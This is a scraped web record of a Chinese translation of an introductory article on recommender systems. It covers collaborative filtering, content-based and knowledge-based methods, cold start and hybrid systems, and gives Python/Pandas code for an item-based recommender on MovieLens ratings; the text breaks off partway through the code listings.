{"url_object_id": "88d72b6ddc5b2258e74e168818d2bf9e", "title": ["推荐系统概述"], "url": "http://blog.jobbole.com/114167/", "create_date": "2018/07/30", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/05/1a58c225e4d199c6b01c7dcec81cea65.png"], "praise_nums": "2", "comment_nums": 1, "fav_nums": 1, "tags": "IT技术, Pandas, 协同过滤, 推荐系统", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q2346410846\">Marticles</a> 翻译，<a href=\"http://www.jobbole.com/members/buntamarui\">小米云豆粥</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://dzone.com/articles/introduction-to-recommender-systems\">Toby Daigle</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><blockquote><p>“聆忠言者众，惟智者受益。” — 哈珀·李</p></blockquote>\n<p>许多人把推荐系统视为一种神秘的存在，他们觉得推荐系统似乎知道我们的想法是什么。Netflix 向我们推荐电影，还有亚马逊向我们推荐该买什么样的商品。推荐系统从早期发展到现在，已经得到了很大的改进和完善，以不断地提高用户体验。尽管推荐系统中许多都是非常复杂的系统，但其背后的基本思想依然十分简单。</p>\n<h2>推荐系统是什么？</h2>\n<p>推荐系统是信息过滤系统的一个子类，它根据用户的偏好和行为，来向用户呈现他(或她)可能感兴趣的物品。推荐系统会尝试去预测你对一个物品的喜好，以此向你推荐一个你很有可能会喜欢的物品。</p>\n<h2>如何构建一个推荐系统？</h2>\n<p>现在已经有很多种技术来建立一个推荐系统了，我选择向你们介绍其中最简单，也是最常用的三种。他们是：<strong>一，协同过滤；二，基于内容的推荐系统；三，基于知识的推荐系统。</strong>我会解释前面的每个系统相关的弱点，潜在的缺陷，以及如何去避免它们。最后，我在文章末尾为你们准备了一个推荐系统的完整实现。</p>\n<h3>协同过滤</h3>\n<p>协同过滤，是首次被用于推荐系统上的技术，至今仍是最简单且最有效的。协同过滤的过程分为这三步：一开始，收集用户信息，然后以此生成矩阵来计算用户关联，最后作出高可信度的推荐。这种技术分为两大类：一种基于用户，另一种则是基于组成环境的物品。</p>\n<h4>基于用户的协同过滤</h4>\n<p>基于用户的协同过滤本质上是寻找与我们的目标用户具有相似品味的用户。如果Jean-Pierre和Jason曾对几部电影给出了相似的评分，那么我们认为他们就是相似的用户，接着我们就可以使用Jean Pierre的评分来预测Jason的未知评分。例如，如果Jean-Pierre喜欢星球大战3:绝地武士归来和星球大战5:帝国反击战，Jason也喜欢绝地武士归来，那么帝国反击战对Jason来说是就是一个很好的推荐。一般来说，你只需要一小部分与Jason相似的用户来预测他的评价。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1a58c225e4d199c6b01c7dcec81cea65.png\" alt=\"User-based CF\"></p>\n<p>在下表中，每行代表一个用户，每列代表一部电影，只需简单地查找这个矩阵中行之间的相似度，就可以找到相似的用户了。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1f6a3de5d4711489a71f4d1dae2a8009.png\" alt=\"User-based CF Matrix\"></p>\n<p>然而，基于用户的协同过滤在实现中存在一些以下问题：</p>\n<ul>\n<li>用户偏好会随时间的推移而改变，推荐系统生成的许多推荐可能会随之变得过时。</li>\n<li>用户的数量越多，生成推荐的时间就越长。</li>\n<li>基于用户会导致对托攻击敏感，这种攻击方法是指恶意人员通过绕过推荐系统，使得特定物品的排名高于其他物品。<br>\n(托攻击即Shilling Attack,是一种针对协同过滤根据近邻偏好产生推荐的特点，恶意注入伪造的用户模型，推高或打压目标排名，从而达到改变推荐系统结果的攻击方式)</li>\n</ul>\n<h4>基于物品的协同过滤</h4>\n<p>基于物品的协同过滤过程很简单。两个物品的相似性基于用户给出的评分来算出。让我们回到Jean-Pierre与Jason的例子，他们两人都喜欢“绝地武士归来”和“帝国反击战”。 因此，我们可以推断，喜欢第一部电影的大多数用户也可能会喜欢第二部电影。所以，对于喜欢“绝地武士归来”的第三个人Larry来说，”帝国反击战“的推荐将是有意义的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/3bb79bc04f2079a3ce6b30b9ce70e65c.png\" alt=\"Item-based CF\"></p>\n<p>所以，这里的相似度是根据列而不是行来计算的(与上面的用户-电影矩阵中所见的不同)。基于物品的协同过滤常常受到青睐，因为它没有任何基于用户的协同过滤的缺点。首先，系统中的物品(在这个例子中物品就是电影)不会随着时间的推移而改变，所以推荐会越来越具有关联性。此外，通常推荐系统中的物品都会比用户少，这减少了推荐的处理时间。最后，考虑到没有用户能够改变系统中的物品，这种系统要更难于被欺骗或攻击。</p>\n<h3>基于内容的推荐系统</h3>\n<p>在基于内容的推荐系统中，元素的描述性属性被用来构成推荐。“内容Content”一词指的就是这些描述。举个例子，根据Sophie的听歌历史，推荐系统注意到她似乎喜欢乡村音乐。因此，系统可以推荐相同或相似类型的歌曲。更复杂的推荐系统能够发现多个属性之间的关系，从而产生更高质量的推荐。例如，音乐基因组计划(Music Genome Project)根据450个不同的属性将数据库中的每支歌曲进行分类。该项目为Pandor的歌曲推荐提供技术支持。(Pandor提供在线音乐流媒体服务，类似Spolify)</p>\n<h3>基于知识的推荐系统</h3>\n<p>基于知识的推荐系统在物品购买频率很低的情况下特别适用。例如房屋、汽车、金融服务甚至是昂贵的奢侈品。在这种情况下，推荐的过程中常常缺乏商品的评价。基于知识的推荐系统不使用评价来作出推荐。相反，推荐过程是基于顾客的需求和商品描述之间的相似度，或是对特定用户的需求使用约束来进行的。这使得这种类型的系统是独一无二的，因为它允许顾客明确地指定他们想要什么。关于约束，当应用时，它们大多是由该领域的专家实施的，这些专家从一开始就知道该如何实施这些约束。例如，当用户明确指出在一个特定的价格范围内寻找一个家庭住宅时，系统必须考虑到这个用户规定的约束。</p>\n<h2>推荐系统中的冷启动问题</h2>\n<p>推荐系统中的主要问题之一是最初可用的评价数量相对较小。当新用户还没有给电影打分，或者一部新的电影被添加到系统中时，我们该怎么做呢？在这种情况下，应用传统的协同过滤模型会更加困难。尽管基于内容和基于知识的推荐算法在面临冷启动问题时比协同过滤更具有鲁棒性，但基于内容和基于知识并不总是可用的。因此，一些新方法，比如混合系统，已经被设计出用来解决这个问题了。</p>\n<h2>混合推荐系统</h2>\n<p>文章到目前为止所介绍的不同类型的推荐系统都各有优劣，他们根据不同的数据给出推荐。 一些推荐系统，如基于知识的推荐系统，在数据量有限的冷启动环境下最为有效。其他系统，如协同过滤，在有大量数据可用时则更加有效。在多数情况下，数据都是多样化的，我们可以为同一任务灵活采用多种方法。 因此，我们可以结合多种不同技术的推荐来提高整个系统的推荐质量。许多的组合性技术已经被探索出来了，包括：</p>\n<ul>\n<li>加权：为推荐系统中的每种算法都赋予不同的权重，使得推荐偏向某种算法</li>\n<li>交叉：将所有的推荐结果集合在一起展现，没有偏重</li>\n<li>增强：一个系统的推荐将作为下一个系统的输入，循环直至最后一个系统为止</li>\n<li>切换：随机选择一种推荐方法</li>\n</ul>\n<p>混合推荐系统中的一个最有名的例子是于2006至2009年举行的Netflix Price算法竞赛。这个竞赛的目标是将Netflix的电影推荐系统Cinematch的算法准确率提高至少10%。Bellkor’s Pragmatix Chaos团队用一种融合了107种不同算法的方案将Cinematch系统的推荐准确率提高了10.06%，并最终获得了100万美元奖金。你可能会对这个例子中的准确率感到好奇，准确率其实就是对电影的预测评分与实际评分接近程度的度量。</p>\n<h2>推荐系统与AI？</h2>\n<p>推荐系统常用于人工智能领域。推荐系统的能力 – 洞察力，预测事件的能力和突出关联的能力常被用于人工智能中。另一方面，机器学习技术常被用于实现推荐系统。例如，在Arcbees，我们使用了神经网络和来自IMdB的数据成功建立了一个电影评分预测系统。神经网络可以快速地执行复杂的任务并轻松地处理大量数据。通过使用电影列表作为神经网络的输入，并将神经网络的输出与用户评分进行比较，神经网络可以自我学习规则以预测特定用户的未来评分。</p>\n<h2>专家建议</h2>\n<p>在我读过许多资料中，我注意到有两个很重要的建议经常被推荐系统领域内的专家提及。第一，基于用户付费的物品进行推荐。当一个用户有购买意愿时，你就可以断定他的评价一定是更具有相关性与准确的。第二，使用多种算法总是比改进一种算法要好。Netflix Prize竞赛就是一个很好的例子。</p>\n<h2>实现一个基于物品的推荐系统</h2>\n<p>下面的代码演示了实现一个基于物品的推荐系统是多么的简单与快速。所使用的语言是Python，并使用了Pandas与Numpy这两个在推荐系统领域中最流行的库。所使用的数据是电影评分，数据集来自MovieLens。</p>\n<h3>第一步：寻找相似的电影</h3>\n<p>1.读取数据</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449dfff1122977332\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport pandas as pd\r\nimport numpy as np\r\n\r\nratings_cols = ['user_id', 'movie_id', 'rating']\r\nratings = pd.read_csv('u.data', sep='t', names=ratings_cols, usecols=range(3))\r\n\r\nmovies_cols = ['movie_id', 'title']\r\nmovies = pd.read_csv('u.item', sep='|', names=movies_cols, usecols=range(2))\r\n\r\nratings = pd.merge(ratings, movies)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfff1122977332-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfff1122977332-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">pandas </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-2\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">numpy </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">np</span></div><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-4\"><span class=\"crayon-v\">ratings_cols</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'user_id'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'movie_id'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-5\"><span class=\"crayon-v\">ratings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">read_csv</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'u.data'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sep</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'t'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">names</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">ratings_cols</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">usecols</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-7\"><span class=\"crayon-v\">movies_cols</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'movie_id'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'title'</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-8\"><span class=\"crayon-v\">movies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">read_csv</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'u.item'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sep</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'|'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">names</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">movies_cols</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">usecols</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625449dfff1122977332-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfff1122977332-10\"><span class=\"crayon-v\">ratings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">merge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ratings</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movies</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>2.构造用户的电影矩阵</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449dfffa872447605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmovieRatings = ratings.pivot_table(index=['user_id'],columns=['title'],values='rating')</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449dfffa872447605-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449dfffa872447605-1\"><span class=\"crayon-v\">movieRatings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ratings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pivot_table</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'user_id'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">columns</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'title'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">values</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>3.选择一部电影并生成这部电影与其他所有电影的相似度</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449dfffe014659830\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstarWarsRatings = movieRatings['Star Wars (1977)']\r\n\r\nsimilarMovies = movieRatings.corrwith(starWarsRatings)\r\nsimilarMovies = similarMovies.dropna()\r\ndf = pd.DataFrame(similarMovies)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449dfffe014659830-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfffe014659830-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfffe014659830-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449dfffe014659830-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625449dfffe014659830-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449dfffe014659830-1\"><span class=\"crayon-v\">starWarsRatings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movieRatings</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'Star Wars (1977)'</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfffe014659830-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b625449dfffe014659830-3\"><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movieRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">corrwith</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">starWarsRatings</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449dfffe014659830-4\"><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">dropna</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625449dfffe014659830-5\"><span class=\"crayon-v\">df</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">DataFrame</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>4.去除不流行的电影以避免生成不合适的推荐</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0002922382775\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nratingsCount = 100\r\nmovieStats = ratings.groupby('title').agg({'rating': [np.size, np.mean]})\r\npopularMovies = movieStats['rating']['size'] &gt;= ratingsCount\r\nmovieStats[popularMovies].sort_values([('rating', 'mean')], ascending=False)[:15]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0002922382775-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0002922382775-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e0002922382775-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0002922382775-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0002922382775-1\"><span class=\"crayon-v\">ratingsCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0002922382775-2\"><span class=\"crayon-v\">movieStats</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ratings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">groupby</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'title'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">agg</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">{</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">mean</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e0002922382775-3\"><span class=\"crayon-v\">popularMovies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span 